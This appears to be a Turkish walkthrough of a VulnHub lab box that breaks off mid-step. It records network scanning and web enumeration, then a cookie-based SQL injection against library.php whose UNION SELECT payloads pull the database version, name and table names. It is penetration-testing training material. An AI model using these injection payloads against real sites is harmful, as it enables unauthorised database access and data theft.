# UNKNOWNDEVICE64-V1 Kutusunun Çözümü
**Yazar:** Beren Kuday GÖRÜN<br>
**Tarih:** 05.05.2019<br>
**IP:** 192.168.171.136<br>
**Not:** Kutunun indirme adresi 'kutu' isimli klasöre eklenmiştir.<br>
**Flag:** /root/flag.txt'yi oku<br>
**Sayfa:** https://www.vulnhub.com/entry/unknowndevice64-1,293/

## 1.	Bilgi Toplama
### 1.1	Ip Tespiti:
```sh
root@kali:~# arp-scan -l
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.119.1	00:50:56:c0:00:08	VMware, Inc.
192.168.119.2	00:50:56:e0:33:be	VMware, Inc.
192.168.119.131	00:0c:29:34:49:bb	VMware, Inc.
192.168.119.254	00:50:56:fa:58:0a	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.5: 256 hosts scanned in 2.383 seconds (107.43 hosts/sec). 4 responded
```
Ip adresi 192.168.119.131 olarak belirlenmiştir.

### 1.2	Servis Tespiti:
```sh
root@kali:~# nmap -p- -A 192.168.119.131
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-28 08:21 EDT
Nmap scan report for 192.168.119.131
Host is up (0.00038s latency).
Not shown: 55531 filtered ports, 10002 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:34:49:BB (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.119.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.82 seconds
```
ftp ve http servisleri açık görülmüştür. İlk olarak hemen nikto ve dirbuster'ı çalıştırdım.
1. Nikto çıktısı:
```sh
root@kali:~# nikto -h http://192.168.119.131
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.119.131
+ Target Hostname:    192.168.119.131
+ Target Port:        80
+ Start Time:         2019-07-28 08:23:25 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 58dde3274d516, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2019-07-28 08:24:25 (GMT-4) (60 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
2. Dirbuster çıktısı:
```
root@kali:~/Desktop/192.168.119.131# dirbuster
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
File found: /library.php - 200
Dir found: / - 200
Dir found: /icons/ - 403
File found: /icons/small - 301
Dir found: /icons/small/ - 403
```
library.php isimli bir dosya bulmuş olduk. Bu sayfaya tarayıcıdan gittim ve incelemeye başladım. Cookilerle işlem yaptığını anladım.
<div align="center">
    <img src="dosyalar/cookie.png" style="width:100%;">
    <p>Cookie</p>
</div>
Cookieleri gördükten sonra decode işlemi gerçekleştirdim ve bu sonucu elde ettim `{"lastviewed"=="Scotland"}`. Sayfada pek bir şey yok ve paragrafta ise bir eksiklik var gibi:

```sh
We couldn't find any information for .

Please try again later.
```
Tek işlem yapabileceğim şey burada cookie gibi duruyor. Bunun üzerinde cookie based sql injection denemeye karar verdim ancak cookie ifadesi bir sql komutuna yada yapısına benzemiyordu. Arka planda bunu parse işlemine soktuğu kesin bu yüzden biraz üzerinde oynadım.
1. `"{"lastviewed"=="'Spain'"}"` ifadesi ile doğru sonucu elde ettim. Artık burada sql injection yapabilirim.
2. Veritabanı versiyonun bulalım: `"{"lastviewed"=="'Spain' UNION SELECT @@version"}"` : Bize geri dönen cevap:
```
We couldn't find any information for 5.7.27-0ubuntu0.16.04.1.
```
Güzel kodlarımızın çalıtığı anlamına geliyor. Şimdi veritabanı ismini tablo adını ve içini okumaya çalışacağız.
3. `"{"lastviewed"=="'Spain' UNION SELECT database()"}"`
```
We couldn't find any information for library.
```
Veritabanı ismimiz `library`.
4. Şimdi tablololara ulaşalım. `"{"lastviewed"=="'Spain' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'library'"}"`
```
We couldn't find any information for countries.
```
Çok güzel countries tablosunu bulduk.
5.